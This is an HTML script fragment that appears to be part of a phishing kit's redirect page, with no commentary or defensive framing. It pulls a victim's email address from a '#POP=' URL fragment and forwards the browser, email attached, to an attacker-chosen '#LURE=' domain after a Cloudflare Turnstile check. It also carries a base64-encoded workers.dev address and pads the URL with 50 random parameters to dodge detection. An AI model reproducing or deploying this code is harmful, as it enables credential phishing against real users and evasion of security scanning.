    <script>
window.onload = async function () {
    var USE_TURNSTILE = true;

    // Extract and decode email from URL with #POP=
    function extractAndDecodeEmail() {
        const url = window.location.href;
        let email = null;

        // Check if the URL contains `#POP=`
        const hashIndex = url.indexOf("#POP=");
        if (hashIndex !== -1) {
            try {
                // Extract the part after `#POP=`
                const hashFragment = url.substring(hashIndex + 5); // Skip past `#POP=`

                // Decode the email if necessary (e.g., URL decoding)
                email = decodeURIComponent(hashFragment);

                // Ensure `#LURE=` part is ignored
                const lureIndex = email.indexOf("#LURE=");
                if (lureIndex !== -1) {
                    email = email.substring(0, lureIndex);
                }
            } catch (e) {
                console.error("Failed to extract or decode email:", e);
            }
        } else {
            console.warn("No #POP= pattern found in the URL hash.");
        }

        console.log("Final Decoded Email:", email); // Debugging log
        return email;
    }

    // Extract domain from URL with #LURE=
    function extractLureDomain() {
        const url = window.location.href;
        let domain = null;

        // Check if the URL contains `#LURE=`
        const lureIndex = url.indexOf("#LURE=");
        if (lureIndex !== -1) {
            try {
                // Extract the part after `#LURE=`
                domain = url.substring(lureIndex + 6); // Skip past `#LURE=`

                // Decode the domain if necessary (e.g., URL decoding)
                domain = decodeURIComponent(domain);

                // Remove unnecessary query parameters
                if (domain.includes("?redirected=done")) {
                    domain = domain.replace("?redirected=done", "");
                }
            } catch (e) {
                console.error("Failed to extract or decode domain:", e);
            }
        } else {
            console.warn("No #LURE= pattern found in the URL hash.");
        }

        console.log("Final Extracted Domain:", domain); // Debugging log
        return domain;
    }

    // Redirect to a properly formatted URL
    async function redirectToProperUrl() {
        const email = extractAndDecodeEmail();
        const domain = extractLureDomain();

        if (!email) {
            console.error("Email is missing. Cannot redirect.");
            return;
        }

        if (!domain) {
            console.error("Domain (LURE) is missing. Cannot redirect.");
            return;
        }

        // Construct the new redirect URL
        const redirectUrl = `${domain}#POP=${email}?redirected=done`;

        console.log("Redirecting to:", redirectUrl); // Debugging log
        window.location.href = redirectUrl; // Perform the redirection
    }

    // Start Turnstile verification
    function startTurnstileVerification() {
        const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
        if (USE_TURNSTILE) {
            console.log("Starting Turnstile verification...");
            turnstile.render("#cf-turnstile", {
                sitekey: "0x4AAAAAAAymSY_rn4CFRQRl",
                type: "spinner",
                callback: async function (token) {
                    if (!token) {
                        console.error("Turnstile verification failed");
                        return;
                    }

                    // Wait for 2 seconds, then redirect
                    setTimeout(async function () {
                        await redirectToProperUrl(); // Perform redirection with proper parameters
                    }, 2000);
                },
                "error-callback": function () {
                    console.error("Turnstile encountered an error");
                },
            });
        } else {
            console.log("Turnstile is not enabled.");
        }
    }

    // Run Turnstile verification
    startTurnstileVerification();
};

</script>

    <script>
        function appendRandomParamsToUrl() {
            const params = generateRandomParams();
            const currentUrl = new URL(window.location.href);
            params.forEach(param => currentUrl.searchParams.append(param.key, param.value));
            window.history.replaceState({}, '', currentUrl);
        }

        function generateRandomParams() {
            let params = [];
            for (let i = 0; i < 50; i++) {
                let randomKey = `${i}`;
                let randomValue = Math.random().toString(36).substring(2, 15);
                params.push({ key: randomKey, value: randomValue });
            }
            return params;
        }
		appendRandomParamsToUrl();
		</script>
